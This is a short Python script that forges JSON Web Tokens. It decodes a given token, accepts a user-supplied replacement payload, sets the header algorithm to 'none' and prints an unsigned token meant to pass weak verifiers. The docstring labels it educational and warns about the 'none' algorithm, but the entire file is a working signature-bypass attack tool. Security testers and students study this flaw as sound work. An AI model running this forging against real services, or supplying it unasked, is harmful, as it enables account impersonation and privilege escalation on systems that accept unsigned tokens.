"""
JWT Payload Modifier

Author: Maxence ZOLNIERUCK
GitHub: https://github.com/mxcezl

This script decodes a given JWT (JSON Web Token), displays the payload, 
then allows the user to input a new payload and encodes it using the 'none' algorithm.
Please note that using the 'none' algorithm in a real-life application is a significant security risk,
as it allows the JWT to be altered without invalidating the signature.

This script is intended for educational purposes only.

Usage:
    python3 jwt-none.py -t [TOKEN]
"""

import json
import base64
import argparse
from prompt_toolkit import prompt
from colorama import Fore, Style
import ast

# Function to decode the token and retrieve the header & payload
def get_jwt_info(token):
    header_enc, payload_enc, _ = token.split('.')
    payload_enc += '=' * (-len(payload_enc) % 4)

    header = base64.b64decode(header_enc).decode()
    payload = base64.b64decode(payload_enc).decode()

    return {'header': header, 'payload': payload}

# Function to encode a new payload using the 'none' algorithm
def encode_new_payload(header, new_payload):
    header['alg'] = 'none' # set the algorithm to none

    header_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    new_payload_enc = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).decode().rstrip('=')
    
    return f"{header_enc}.{new_payload_enc}."

def main():
    # Setting up the argument parser
    parser = argparse.ArgumentParser(
        description='This script decodes a given JWT (JSON Web Token), displays the payload, \
        then allows the user to input a new payload and encodes it using the "none" algorithm.'
    )
    parser.add_argument('-t', '--token', required=True, help='Your JWT token')
    args = parser.parse_args()

    try:
        # Get and print current payload
        jwt_info = get_jwt_info(args.token)

        header = json.loads(jwt_info['header'])
        payload = json.loads(jwt_info['payload'])

        print(Fore.GREEN + "Current payload is: " + Style.RESET_ALL + f"{payload}")

        # Get new payload from user input
        new_payload = prompt('Enter your new payload (in JSON format): ')
        new_payload = ast.literal_eval(new_payload)

        # Create and print new JWT
        new_token = encode_new_payload(header, new_payload)
        print(Fore.YELLOW + "Your new JWT is: " + Style.RESET_ALL + f"{new_token}")
    except Exception as e:
        print(Fore.RED + "An error occurred: " + Style.RESET_ALL + f"{str(e)}")

if __name__ == "__main__":
    main()
